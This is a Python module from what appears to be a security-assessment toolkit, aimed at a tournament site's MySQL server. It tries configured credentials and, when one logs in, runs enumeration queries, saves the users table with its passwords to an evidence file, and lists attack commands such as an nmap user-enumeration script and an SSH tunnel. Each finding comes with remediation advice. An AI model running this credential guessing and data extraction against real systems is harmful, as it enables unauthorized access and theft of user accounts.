import re
from lib import common, config

META = {"id": "M19"}

CONSULTAS = [
    ("versão", "SELECT VERSION();"),
    ("utilizador", "SELECT USER(), CURRENT_USER();"),
    ("bases", "SHOW DATABASES;"),
    ("grants", "SHOW GRANTS FOR CURRENT_USER();"),
    ("contagem utilizadores", f"SELECT COUNT(*) FROM {config.DB_NAME}.utilizadores;"),
    ("utilizadores", f"SELECT id,nickname,email,palavra_passe,elo FROM {config.DB_NAME}.utilizadores LIMIT 50;"),
]

def run(ctx):
    out, f = [], []
    if not common.tcp_open(ctx.target, config.MYSQL_PORT):
        return common.resultado("3306 fechada", [common.achado(
            "info", "MySQL não exposto", "porta fechada a partir da VLAN40", "", corrigir="")])

    f.append(common.achado("medio", "Serviço MySQL acessível na rede",
                           f"TCP {ctx.target}:3306 aceita ligação",
                           "Alvo de brute force de credenciais de BD; se autenticar, "
                           "dá acesso a todas as tabelas.",
                           [f"nc -zv {ctx.target} 3306"],
                           "my.ini com bind-address=127.0.0.1 ou ACL no firewall."))

    creds = None
    for user, pw in config.DB_USERS:
        cmd = ["mysql", "-h", ctx.target, "-P", str(config.MYSQL_PORT), "-u", user,
               "--protocol=TCP", "--connect-timeout=6", "-e", "SELECT 1;"]
        if pw:
            cmd.insert(4, f"-p{pw}")
        rc, o, _ = common.sh(cmd, timeout=20)
        err = " ".join(l for l in o.splitlines() if "ERROR" in l or "denied" in l.lower())
        out.append(f"[{user}:{pw or '(vazio)'}] rc={rc} {err[:160]}")

        if rc == 0:
            creds = (user, pw)
            break
        if "1130" in o:
            out.append("  -> host da VLAN40 não autorizado (root restrito a localhost)")
        elif "1045" in o:
            out.append("  -> credenciais recusadas")

    if not creds:
        f.append(common.achado(
            "medio", "MySQL exposto mas autenticação recusada remotamente",
            "1130 (host não autorizado) / 1045 (password errada) para root, nexus, admin",
            "A BD não cai por fora, mas a porta aberta permite brute force e, a partir "
            "de qualquer shell no host ou túnel SSH, o acesso é imediato com root sem password.",
            [f"mysql -h {ctx.target} -u root -p",
             f"# ou via túnel: ssh -L 3306:127.0.0.1:3306 utilizador@{ctx.target}",
             "nmap -p3306 --script mysql-enum,mysql-users " + ctx.target],
            "Eliminar o root sem password e criar utilizador de app com GRANT mínimo "
            "(SELECT/INSERT/UPDATE em bd_torneios apenas)."))
        return common.resultado("\n".join(out), f)

    user, pw = creds
    out.append(f"AUTENTICADO como {user}")
    f.append(common.achado("crit", f"Acesso directo à base de dados ({user})",
                           f"mysql -h {ctx.target} -u {user} aceite",
                           "Leitura e escrita de toda a BD, incluindo a tabela de utilizadores.",
                           [f"mysql -h {ctx.target} -u {user} -p -D {config.DB_NAME} -e 'show tables;'"],
                           "Utilizador dedicado e password forte; 3306 só na rede interna."))

    for nome, q in CONSULTAS:
        cmd = ["mysql", "-h", ctx.target, "-P", str(config.MYSQL_PORT), "-u", user,
               "--protocol=TCP", "--connect-timeout=6", "--batch", "--raw", "-e", q]
        if pw:
            cmd.insert(4, f"-p{pw}")
        ctx.cmd(f"mysql -e \"{q}\"")
        rc, o, _ = common.sh(cmd, timeout=30)
        out.append(f"\n>>> {nome}\n{o.strip() or '(vazio)'}")

        if nome == "utilizadores" and o.strip():
            ctx.evidencia("M19_utilizadores.txt", o)
            out.append("(guardado em evidencias/M19_utilizadores.txt)")
            if re.search(r"\t(?!\$2[aby]|\$argon|\$pbkdf2)[^\t]{3,40}\t", o):
                f.append(common.achado(
                    "crit", "Passwords em TEXTO LIMPO na tabela utilizadores",
                    "coluna palavra_passe com valores legíveis (sem hash $2b$/$argon/$pbkdf2)",
                    "Quem lê a tabela fica com todas as contas; não há custo de cracking.",
                    [f"mysql -h {ctx.target} -u {user} -e 'SELECT nickname,palavra_passe FROM {config.DB_NAME}.utilizadores;'"],
                    "Guardar hash (make_password/check_password, PBKDF2 ou Argon2)."))
    return common.resultado("\n".join(out), f)